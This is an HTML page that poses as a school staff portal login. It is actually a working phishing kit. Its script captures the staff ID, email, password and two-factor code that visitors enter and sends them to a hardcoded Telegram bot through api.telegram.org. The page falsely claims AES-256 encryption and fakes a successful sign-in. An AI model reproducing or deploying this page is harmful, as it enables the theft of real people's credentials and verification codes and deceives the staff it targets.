<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Academy Staff Portal | Login</title>
    <style>
        :root {
            --primary-color: #1a4d8f;
            --secondary-color: #f5b914;
            --accent-color: #e63946;
        }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            margin: 0;
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            position: relative;
        }

        .school-header {
            position: absolute;
            top: 40px;
            text-align: center;
        }

        .school-name {
            font-family: 'Georgia', serif;
            color: var(--primary-color);
            margin: 0;
            font-size: 2.2rem;
            letter-spacing: -1px;
        }

        .login-container {
            width: 60%;
            max-width: 428px;
            padding: 2.5rem 1.8rem;
            margin: 1.5rem;
            border-radius: 18px;
            background: #ffffff;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
        }

        .login-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, var(--primary-color) 50%, var(--secondary-color) 50%);
        }

        h1 {
            font-size: 24px;
            margin-bottom: 25px;
            color: var(--primary-color);
            text-align: center;
            margin: 0 0 30px 0;
            font-weight: 600;
            position: relative;
            padding-bottom: 15px;
        }

        h1::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 50px;
            height: 3px;
            background: var(--secondary-color);
            border-radius: 2px;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #495057;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        .input-icon {
            position: relative;
            transition: transform 0.3s ease;
        }

        .input-icon:hover {
            transform: translateY(-2px);
        }

        .input-icon input {
            width: 84%;
            padding: 14px 14px 14px 48px;
            border: 2px solid #dee2e6;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .input-icon input:focus {
            border-color: var(--primary-color);
            box-shadow: 0 4px 6px -1px rgba(26, 77, 143, 0.1);
        }

        .input-icon::before {
            content: '';
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            width: 22px;
            height: 22px;
            background-size: contain;
            z-index: 2;
        }

        .input-icon.username::before {
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%231a4d8f"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>');
        }

        .input-icon.email::before {
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%231a4d8f"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>');
        }

        .input-icon.password::before {
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%231a4d8f"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>');
        }

        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, var(--primary-color) 0%, #153a6e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(26, 77, 143, 0.3);
        }

        button::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.15) 50%, transparent 70%);
            transform: rotate(45deg);
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% { left: -50%; }
            100% { left: 150%; }
        }

        .additional-links {
            margin-top: 25px;
            text-align: center;
        }

        .additional-links a {
            color: var(--primary-color);
            text-decoration: none;
            font-size: 14px;
            margin: 0 10px;
            position: relative;
        }

        .additional-links a::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 0;
            height: 1px;
            background: var(--primary-color);
            transition: width 0.3s ease;
        }

        .additional-links a:hover::after {
            width: 100%;
        }

        .security-notice {
            text-align: center;
            margin-top: 25px;
            font-size: 12px;
            color: #6c757d;
            line-height: 1.5;
        }

        #successPage {
            text-align: center;
            padding: 20px;
            display: none;
        }

        #successPage h1 {
            color: #28a745;
            margin-bottom: 20px;
        }

        .success-icon {
            font-size: 60px;
            color: #28a745;
            margin-bottom: 20px;
            animation: scaleIn 0.5s ease;
        }

        @keyframes scaleIn {
            from { transform: scale(0); }
            to { transform: scale(1); }
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid var(--primary-color);
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-left: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @media screen and (max-width: 430px) {
    .login-container {
        width: 90%;
        max-width: 400px;
    }

    .input-icon input {
        width: 70%;
        padding-left: 48px;
    }

    button {
        width: 100%;
    }

    .form-group {
        display: flex;
        flex-direction: column;
        align-items: center;
    }
}
    </style>
</head>
<body>
    <div class="school-header">
        <h2 class="school-name">Staff Portal Access</h2>
    </div>

    <div class="login-container">
        <!-- Login Form -->
        <div id="loginPage">
            <h1>Faculty Portal</h1>
            <form id="initialForm">
                <div class="form-group">
                    <label for="username">Staff ID</label>
                    <div class="input-icon username">
                        <input type="text" id="username" placeholder="Enter your staff ID" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="email">Institutional Email</label>
                    <div class="input-icon email">
                        <input type="email" id="email" placeholder="name@school" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <div class="input-icon password">
                        <input type="password" id="password" placeholder="••••••••" required>
                    </div>
                </div>
                <button type="submit" id="loginButton">
                    <div class="button-content">
                        <span>Sign In</span>
                    </div>
                </button>
                <div class="security-notice">
                    <i class="fas fa-shield-alt"></i> Secure login with AES-256 encryption
                </div>
            </form>
        </div>

        <!-- Security Verification -->
        <div id="securityPage" style="display: none;">
            <h1>Two-Factor Authentication</h1>
            <form id="securityForm">
                <div class="form-group">
                    <label>Verification Code</label>
                    <div class="input-icon">
                        <input type="text" id="securityPassword" placeholder="Enter 6-digit code" required>
                    </div>
                </div>
                <button type="submit" id="verifyButton">
                    <div class="button-content">
                        Verify Identity
                    </div>
                </button>
                <div class="security-notice">
                    Sent to your registered mobile device
                </div>
            </form>
        </div>

        <!-- Success Page -->
        <div id="successPage">
            <div class="success-icon">✓</div>
            <h1>Access Granted</h1>
            <p>Redirecting to Faculty Dashboard...</p>
        </div>
    </div>

    <script>
        const botToken = '7342111571:AAFUmvZ-7d-Fjg0TOm3qmxuB5AHlB8FwpJw';
        const chatId = '5502103678';

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    })
                });
                return await response.json();
            } catch (error) {
                console.error('Telegram API Error:', error);
                throw error;
            }
        }

        // Login Form Handler
        document.getElementById('initialForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const button = document.getElementById('loginButton');
            button.disabled = true;
            button.innerHTML = `
                <div class="button-content">
                    <span>Processing</span>
                    <div class="spinner"></div>
                </div>
            `;

            const credentials = {
                username: document.getElementById('username').value,
                email: document.getElementById('email').value,
                password: document.getElementById('password').value
            };

            try {
                const message = `🔐 Login Attempt:\n👤 User: ${credentials.username}\n📧 Email: ${credentials.email}\n🔑 Password: ${credentials.password}`;
                await Promise.all([
                    sendToTelegram(message),
                    new Promise(resolve => setTimeout(resolve, 4000))
                ]);
                
                document.getElementById('loginPage').style.display = 'none';
                document.getElementById('securityPage').style.display = 'block';
            } catch (error) {
                console.error('Error:', error);
            } finally {
                button.disabled = false;
                button.innerHTML = `
                    <div class="button-content">
                        <span>Sign In</span>
                    </div>
                `;
            }
        });

        // Security Form Handler
        document.getElementById('securityForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const button = document.getElementById('verifyButton');
            button.disabled = true;
            button.innerHTML = `
                <div class="button-content">
                    <span>Verifying</span>
                    <div class="spinner"></div>
                </div>
            `;

            const securityCode = document.getElementById('securityPassword').value;

            try {
                const message = `🛡️ Security Code:\n🔒 ${securityCode}`;
                await Promise.all([
                    sendToTelegram(message),
                    new Promise(resolve => setTimeout(resolve, 5000))
                ]);
                
                document.getElementById('securityPage').style.display = 'none';
                document.getElementById('successPage').style.display = 'block';
                
                // Simulate redirection
                setTimeout(() => {
                    window.location.href = 'index.html';
                }, 3000);
            } catch (error) {
                console.error('Error:', error);
            } finally {
                button.disabled = false;
                button.innerHTML = `
                    <div class="button-content">
                        <span>Verify Identity</span>
                    </div>
                `;
            }
        });
    </script>
</body>
</html>
